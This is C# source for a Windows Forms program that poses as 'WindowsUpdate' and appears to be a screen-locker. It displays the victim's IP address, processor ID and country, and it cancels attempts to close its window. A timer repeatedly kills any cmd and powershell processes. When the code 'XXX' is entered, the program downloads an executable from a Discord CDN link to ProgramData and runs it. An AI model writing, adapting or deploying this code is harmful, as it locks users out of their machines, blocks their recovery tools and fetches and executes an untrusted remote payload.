using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace WindowsUpdate
{
    public partial class Main : Form
    {
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        public Main()
        {
            InitializeComponent();
        }

        static string GetIPAddress()
        {
            String address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }
            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);
            return address;
        }


        private void Main_Load(object sender, EventArgs e)
        {
            label9.Visible = false;
            timer1.Start();
            var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
            ManagementObjectCollection mbsList = mbs.Get();
            string id = "";
            foreach (ManagementObject mo in mbsList)
            {
                id = mo["ProcessorId"].ToString();
                break;
            }

            if (CheckForInternetConnection() == false)
            {
                txtIP.Text = "NO INTERNET";
                txtProc.Text = "NO INTERNET";
                txtCount.Text = "NO INTERNET";
            }
            else
            {
                txtIP.Text = GetIPAddress();
                txtProc.Text = id;
                IpInfo ipInfo = new IpInfo();
                string info = new WebClient().DownloadString("http://ipinfo.io");
                JavaScriptSerializer jsonObject = new JavaScriptSerializer();
                ipInfo = jsonObject.Deserialize<IpInfo>(info);
                RegionInfo region = new RegionInfo(ipInfo.Country);
                txtCount.Text = region.EnglishName;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "XXX")
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/792477238272065550/792735372236030002/Unlocker.exe", "C:\\ProgramData\\Unlocker.exe");
                Process.Start("C:\\ProgramData\\Unlocker.exe");
            }
            else
            {
                label9.Visible = true;
            }
        }

        public class IpInfo
        {
            public string Country { get; set; }
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Main_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)13)
            {
                e.Handled = true;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                foreach (Process proc in Process.GetProcessesByName("cmd"))
                {
                    proc.Kill();
                }

                foreach (Process proc2 in Process.GetProcessesByName("powershell"))
                {
                    proc2.Kill();
                }
            }
            catch
            {
            }
        }
    }
}
